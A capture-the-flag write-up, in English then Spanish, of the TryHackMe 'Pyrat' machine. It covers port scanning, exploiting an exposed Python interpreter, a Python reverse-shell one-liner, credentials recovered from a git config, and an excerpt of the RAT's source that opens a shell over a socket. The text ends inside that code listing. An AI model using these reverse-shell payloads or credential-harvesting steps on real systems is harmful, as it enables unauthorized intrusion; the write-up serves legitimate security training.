# Pyrat - TryHackMe Writeup

## CTF Context

Pyrat receives a curious response from a server, which leads to a potential Python code execution vulnerability. With a cleverly crafted payload, it is possible to gain a shell on the machine. Delving into the directories, the author uncovers a well-known folder that provides a user with access to credentials. A subsequent exploration yields valuable insights into the application's older version. Exploring possible endpoints using a custom script, the user can discover a special endpoint and ingeniously expand their exploration by fuzzing passwords. The script unveils a password, ultimately granting access to root.

---

## Step 1: Reconnaissance

First, I run a port scan with the following command:

```bash
nmap -Pn -sV 10.64.189.210
```

The results show 2 open ports:

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2
```

Since I don't have SSH credentials yet, I will try connecting to port 8000 using Netcat.

---

## Step 2: Establish Connection

```bash
nc -v 10.64.189.210 8000
```

```
10.64.189.210: inverse host lookup failed: Unknown host
(UNKNOWN) [10.64.189.210] 8000 (?) open
```

Once inside Netcat, I try running Linux commands like `whoami`, but it returns:

```
name 'whoami' is not defined
```

Since we are inside a Python interpreter, I will try executing Python code to see if I get a response:

```python
print("test")
```

```
test
```

The test was successful. Since the interpreter is running inside an Ubuntu server, I will try running Linux commands through the `os` library to check which user I am:

```python
import os; print(os.getuid())
```

```
33
```

---

## Step 4: Reverse Shell

It appears we are inside a web server. I will try to create a reverse shell for a more comfortable working environment.

First, I set my machine to listen:

```bash
nc -lvnp 443
```

```
listening on [any] 443 ...
```

Then I send the payload:

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.64.189.210",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])
```

I now have access to the shell:

```
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.140.193] from (UNKNOWN) [10.64.189.210] 46
/bin/sh: 0: can't access tty; job control turned off
$ pwd
/root
```

After navigating through the directories from the root, I found a folder at `/opt/dev`. It didn't appear to contain anything at first glance, so I used `ls -la`:

```bash
ls -la
```

```
total 12
drwxrwxr-x 3 think think 4096 Jun 21  2023 .
drwxr-xr-x 3 root  root  4096 Jun 21  2023 ..
drwxrwxr-x 8 think think 4096 Jun 21  2023 .git
```

After entering the folder, there was a file called `config`, which revealed the credentials for user `think`:

```bash
cat config
```

```
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[user]
        name = Jose Mario
        email = josemlwdf@github.com

[credential]
        helper = cache --timeout=3600

[credential "https://github.com"]
        username = think
        password = _TH1NKINGPirate$_
```

---

## Step 5: SSH Login

Now that I have the credentials, I log in via SSH as `think`:

```bash
ssh think@<IP>
```

```
think@ip-10-64-189-210:~$ ls
snap  user.txt
```

Una vez dentro de think, procedi a buscar cosas manualmente antes de usar un script buscador como linpeas, encontre en la carpeta 

```bash
think@ip-10-66-165-27:/var/mail$ cat think
```
el siguiente mensaje :
```bash
From root@pyrat  Thu Jun 15 09:08:55 2023
Return-Path: <root@pyrat>
X-Original-To: think@pyrat
Delivered-To: think@pyrat
Received: by pyrat.localdomain (Postfix, from userid 0)
        id 2E4312141; Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
Subject: Hello
To: <think@pyrat>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20230615090855.2E4312141@pyrat.localdomain>
Date: Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
From: Dbile Admen <root@pyrat>

Hello jose, I wanted to tell you that i have installed the RAT you posted on your GitHub page, i'll test it tonight so don't be scared if you see it running. Regards, Dbile Admen

```
La definicion de RAT es Remote Access Trojan, como en el correo se menciono que ya estaba instalado dentro dle sistema, procedo a buscarlo en los procesos 

```bash
think@ip-10-66-165-27:/var$ ps aux | grep -i rat
root          15  0.0  0.0      0     0 ?        S    19:11   0:00 [migration/0]
root          21  0.0  0.0      0     0 ?        S    19:11   0:00 [migration/1]
root         740  0.0  0.0   2616   592 ?        Ss   19:12   0:00 /bin/sh -c python3 /root/pyrat.py 2>/dev/null
root         741  0.0  0.7  21872 14484 ?        S    19:12   0:00 python3 /root/pyrat.py
root         746  0.0  0.6 169444 12520 ?        Sl   19:12   0:00 python3 /root/pyrat.py
think       1900  0.0  0.0   6440   656 pts/0    S+   19:41   0:00 grep --color=auto -i rat
```

podemos ver que el troyano ya se encuentra instalado, aunque es el mismo por el que entre por primera vez, asi que luego de buscar entre direcotrios, voli al direcotrio .git dentro de think y encontre esto :

```bash
think@ip-10-66-149-120:/opt/dev/.git$ cat index
DIRCd��C�d��I8T���������B\���� Wd�4▒��vi(
                                         pyrat.py.oldTREE1 0
V2z2e���EL5�    �&Y�9��q���P�������think@ip-10-66-149-120:/opt/dev/.git$ 

```
al parecer habia una version antigua de pyrat.py, intente ver los cambios del directorio pero no me dejaba, asi que me movi a la carpeta principal del repositorio :
```bash
think@ip-10-66-149-120:/opt/dev/.git$ git status
fatal: this operation must be run in a work tree
think@ip-10-66-149-120:/opt/dev/.git$ cd /opt/dev
think@ip-10-66-149-120:/opt/dev$ ls
think@ip-10-66-149-120:/opt/dev$ git status
On branch master
Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
        deleted:    pyrat.py.old

no changes added to commit (use "git add" and/or "git commit -a")
think@ip-10-66-149-120:/opt/dev$ 

```
Restuare el archivo original

```bash
think@ip-10-66-149-120:/opt/dev$ git restore pyrat.py.old
think@ip-10-66-149-120:/opt/dev$ ls
pyrat.py.old
think@ip-10-66-149-120:/opt/dev$ 

```
al leerlo con cat, contiene un script de python adentro
```python
def switch_case(client_socket, data):
    if data == 'some_endpoint':
        get_this_enpoint(client_socket)
    else:
        # Check socket is admin and downgrade if is not aprooved
        uid = os.getuid()
        if (uid == 0):
            change_uid()

        if data == 'shell':
            shell(client_socket)
        else:
            exec_python(client_socket, data)

def shell(client_socket):
    try:
        import pty
        os.dup2(client_socket.fileno(), 0)
        os.dup2(client_socket.fileno(), 1)
        os.dup2(client_socket.fileno(), 2)
        pty.spawn("/bin/sh")
    except Exception as e:
        send_data(client_socket, e

```












